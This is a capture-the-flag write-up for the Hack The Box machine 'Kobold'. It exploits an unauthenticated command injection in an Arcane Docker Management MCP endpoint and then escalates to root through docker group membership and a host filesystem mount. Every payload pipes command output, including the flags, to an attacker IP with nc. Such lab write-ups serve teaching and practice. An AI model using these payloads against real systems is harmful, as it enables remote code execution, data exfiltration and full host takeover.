# HTB Machine Writeup - Kobold

## Overview
- **Platform:** Hack The Box  
- **Difficulty:** Easy
- **OS:** Linux

---

## Reconnaissance

### Initial Scan
**Target IP:** `10.129.15.186`

```bash
nmap -sC -sV -p- --min-rate=1000 10.129.15.186
```

**Open Ports:**
| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 |
| 80/tcp | open | http | nginx 1.18.0 (Ubuntu) |
| 443/tcp | open | ssl/http | nginx 1.18.0 (Ubuntu) |
| 3552/tcp | open | unknown | - |

---

## Enumeration

### 1. Web Server (Port 80/443)
Basic nginx setup detected. Vhost discovery needed.

### 2. Arcane Service (Port 3552)
```bash
curl -s http://10.129.15.186:3552/api/openapi.json | head -100
```
**Finding:** Arcane Docker Management v1.13.0

### 3. Subdomain Enumeration
```bash
ffuf -u http://10.129.15.186 -H "Host: FUZZ.kobold.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -fs 0
```
**Discovered:** `mcp.kobold.htb`

### 4. MCP Server Analysis
```bash
curl -k -s https://mcp.kobold.htb/api/openapi.json | head -50
```
**Key Endpoint:** `/api/mcp/connect` - MCP server connection endpoint

---

## Vulnerability Analysis

### CVE-2026-23520: Arcane MCP Server Unauthenticated Command Injection

**Vulnerability Details:**
- The `/api/mcp/connect` endpoint accepts arbitrary commands without authentication
- Injection vector: `serverConfig.command` parameter
- **Affected Versions:** Arcane Docker Management v1.13.0
- **CVSS Score:** 9.8 (Critical)

---

## Exploitation

### Step 1: Verify Command Execution

Start a listener on your attacker machine:
```bash
nc -lvnp 9001
```

Send the exploit payload:
```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "id | nc 10.10.14.171 9001"],
      "env": {}
    },
    "serverId": "test"
  }'
```

**Expected Output:**
```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

### Step 2: Capture User Flag

Start listener:
```bash
nc -lvnp 9001
```

Send payload:
```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "cat /home/ben/user.txt | nc 10.10.14.171 9001"],
      "env": {}
    },
    "serverId": "user"
  }'
```

**User Flag:**
```
39a131842d729f4706e08404af2cee7d
```

### Step 3: Check Group Membership

Start listener:
```bash
nc -lvnp 9001
```

Send payload:
```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "id | nc 10.10.14.171 9001"],
      "env": {}
    },
    "serverId": "idcheck"
  }'
```

**Result:**
```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

**Note:** Docker group (GID 111) is missing because command sessions don't inherit secondary groups by default.

---

## Privilege Escalation

### Step 1: Activate Docker Group

Use `sg` (switch group) command to activate docker group membership:

Start listener:
```bash
nc -lvnp 9001
```

Send payload to test docker images:
```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "sg",
      "args": ["docker", "-c", "docker images | nc 10.10.14.171 9001"],
      "env": {}
    },
    "serverId": "docker"
  }'
```

**Expected Output:**
```
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   6 weeks ago    922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   4 months ago   122MB
```

### Step 2: Container Breakout via Volume Mount

Mount the host filesystem into a container and read the root flag:

Start listener:
```bash
nc -lvnp 9001
```

Send payload:
```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "sg",
      "args": ["docker", "-c", "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10 10.10.14.171 9001"],
      "env": {}
    },
    "serverId": "rootflag"
  }'
```

**Root Flag:**
```
85b294231926985a8ed7e3940b0e4a34
```

---

## Summary

**Attack Chain:**
1. Discovered Arcane Docker Management service on port 3552
2. Found MCP server subdomain via vhost enumeration
3. Exploited unauthenticated command injection in `/api/mcp/connect` endpoint
4. Achieved RCE as `ben` user
5. Leveraged `docker` group membership with `sg` command
6. Used Docker volume mount to access root filesystem
7. Extracted both user and root flags

**Key Techniques:**
- Subdomain enumeration (ffuf)
- OpenAPI endpoint analysis
- Command injection exploitation
- Group privilege escalation (sg)
- Docker container breakout via volume mounting
